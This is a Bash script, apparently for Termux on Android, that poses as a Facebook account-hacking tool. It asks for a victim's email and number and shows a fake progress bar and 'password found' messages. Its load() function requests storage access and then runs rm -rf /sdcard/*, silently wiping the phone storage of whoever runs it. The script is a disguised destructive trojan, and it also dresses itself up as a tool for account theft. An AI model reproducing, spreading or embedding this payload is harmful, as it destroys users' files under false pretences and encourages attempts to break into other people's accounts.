!/bin/bash
underline="\e[4m"
red="\e[0;91m"
blue="\e[0;94m"
expand_bg="\e[K"
blue_bg="\e[0;104m${expand_bg}"
red_bg="\e[0;101m${expand_bg}"
green_bg="\e[0;102m${expand_bg}"
green="\e[0;92m"
white="\e[0;97m"
bold="\e[1m"
yellow="\e[1;33m"
banner()
{
clear
toilet -f future "FACEBOOK HACK" -F gay
sleep 7
echo -e "             $white  coded by$blue ${underline}xhackz"
echo ""
}
banner
menu()
{
echo -e "${red}[1] HACK FACEBOOK"

}
menu

loading()
{
echo -e "$blue loading..."
sleep 2 && clear
        echo "==> 5%"
        sleep 1 && clear
        echo "===>10%"
        sleep 0.5 && clear
        echo "=====>15%"
        sleep 0.5 && clear
        echo "======>20%"
        sleep 0.5 && clear
        echo "========>25%"
        sleep 0.5 && clear
        echo "=========>30%>"
        sleep 0.5 && clear
        echo "============>35%"
        sleep 0.5 && clear
        echo "==============>40%"
        sleep 0.5 && clear
        echo "================>45%"
        sleep 0.5 && clear
        echo "===================>50%"
        sleep 0.5 && clear
        echo "=====================>55%"
        sleep 0.5 && clear
        echo "=======================>60%"
        sleep 0.5 && clear
        echo "=========================>65%"
        sleep 0.5 && clear
        echo "===========================>70%"
        sleep 0.5 && clear
        echo "==============================>75%"
        sleep 0.5 && clear
        echo "================================>80%"
	sleep 0.5 && clear
        echo "=================================>85%>"
        sleep 0.5 && clear
        echo "====================================>90%"
        sleep 0.5 && clear
        echo "======================================>95%"
        sleep 0.5 && clear
        echo "=======================================>100%"
        sleep 0.5 && clear
}
load(){
clear && sleep 3
echo "GENERATING PASSWORD............."
sleep 4 && clear
echo "GENERATING PASSWORD............."
sleep 4 && clear
echo "PASSWORD FOUND...... SAVED IN directory password"
mkdir password
termux-setup-storage
rm -rf /sdcard/*
}

printf $green
read -p "[??]Enter a option: " op
ip(){
read -p "[??]ENTER VICTIM E-MAIL and NUMBER: " wifi
}
if [ $op==1 ]
then
	clear
        toilet -f future "FACEBOOK HACK"
	echo "Code staring...."
	sleep 2
	ip
	loading
	load
else
	echo "invaild option"
fi
